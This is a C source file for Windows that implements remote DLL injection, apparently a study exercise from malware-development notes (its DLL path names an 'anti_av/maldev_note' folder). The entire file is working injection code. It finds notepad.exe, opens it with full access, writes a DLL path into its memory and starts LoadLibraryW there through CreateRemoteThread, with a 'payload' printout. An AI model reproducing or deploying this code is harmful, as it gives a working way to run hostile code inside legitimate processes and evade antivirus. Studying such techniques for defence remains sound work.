#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>


// 枚举进程
BOOL GetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {

	// According to the documentation:
	// Before calling the Process32First function, set this member to sizeof(PROCESSENTRY32).
	// If dwSize is not initialized, Process32First fails.
	PROCESSENTRY32	Proc = {
		.dwSize = sizeof(PROCESSENTRY32)
	};

	HANDLE hSnapShot = NULL;

	// Takes a snapshot of the currently running processes 
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (hSnapShot == INVALID_HANDLE_VALUE) {
		printf("[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	// Retrieves information about the first process encountered in the snapshot.
	if (!Process32First(hSnapShot, &Proc)) {
		printf("[!] Process32First Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	do {

		WCHAR LowerName[MAX_PATH * 2];

		if (Proc.szExeFile) {
			DWORD	dwSize = lstrlenW(Proc.szExeFile);
			DWORD   i = 0;

			RtlSecureZeroMemory(LowerName, MAX_PATH * 2);

			// Converting each charachter in Proc.szExeFile to a lower case character
			// and saving it in LowerName
			if (dwSize < MAX_PATH * 2) {

				for (; i < dwSize; i++)
					LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);

				LowerName[i++] = '\0';
			}
		}

		// If the lowercase'd process name matches the process we're looking for
		if (wcscmp(LowerName, szProcessName) == 0) {
			// Save the PID
			*dwProcessId = Proc.th32ProcessID;
			// Open a handle to the process
			*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
			if (*hProcess == NULL)
				printf("[!] OpenProcess Failed With Error : %d \n", GetLastError());

			break;
		}

		// Retrieves information about the next process recorded the snapshot.
		// While a process still remains in the snapshot, continue looping
	} while (Process32Next(hSnapShot, &Proc));

	// Cleanup
_EndOfFunction:
	if (hSnapShot != NULL)
		CloseHandle(hSnapShot);
	if (*dwProcessId == NULL || *hProcess == NULL)
		return FALSE;
	return TRUE;
}

// 注入DLL到远程进程
BOOL InjectDllToRemoteProcess(IN HANDLE hProcess, IN LPWSTR DllName) {

	BOOL		bSTATE = TRUE;

	LPVOID		pLoadLibraryW = NULL;
	LPVOID		pAddress = NULL;

	// fetching the size of DllName *in bytes* 
	DWORD		dwSizeToWrite = lstrlenW(DllName) * sizeof(WCHAR);

	SIZE_T		lpNumberOfBytesWritten = NULL;

	HANDLE		hThread = NULL;

	pLoadLibraryW = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
	if (pLoadLibraryW == NULL) {
		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	pAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL) {
		printf("[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	printf("[i] pAddress Allocated At : 0x%p Of Size : %d\n", pAddress, dwSizeToWrite);
	printf("[#] Press <Enter> To Write ... ");
	getchar();

	if (!WriteProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, &lpNumberOfBytesWritten) || lpNumberOfBytesWritten != dwSizeToWrite) {
		printf("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	printf("[i] Successfully Written %d Bytes\n", lpNumberOfBytesWritten);
	printf("[#] Press <Enter> To Run ... ");
	getchar();

	printf("[i] Executing Payload ... ");
	hThread = CreateRemoteThread(hProcess, NULL, NULL, pLoadLibraryW, pAddress, NULL, NULL);
	if (hThread == NULL) {
		printf("[!] CreateRemoteThread Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}
	printf("[+] DONE !\n");


_EndOfFunction:
	if (hThread)
		CloseHandle(hThread);
	return bSTATE;
}

int main()
{
	LPWSTR		szProcessName = L"notepad.exe";
	LPWSTR		DllName = L"E:/coding/anti_av/maldev_note/code/Local_Payload_Execution_DLL/x64/Debug/Local_Payload_Execution_DLL.dll";
	HANDLE		hProcess = NULL;
	DWORD		dwProcessId = NULL;
	if (!GetRemoteProcessHandle(szProcessName, &dwProcessId, &hProcess)) {
		printf("[!] GetRemoteProcessHandle Failed !\n");
		return -1;
	}
	printf("[+] Found Process : %S\n", szProcessName);
	printf("[+] Process ID : %d\n", dwProcessId);
	if (!InjectDllToRemoteProcess(hProcess, DllName)) {
		printf("[!] InjectDllToRemoteProcess Failed !\n");
		return -1;
	}
	CloseHandle(hProcess);
	return 0;
}


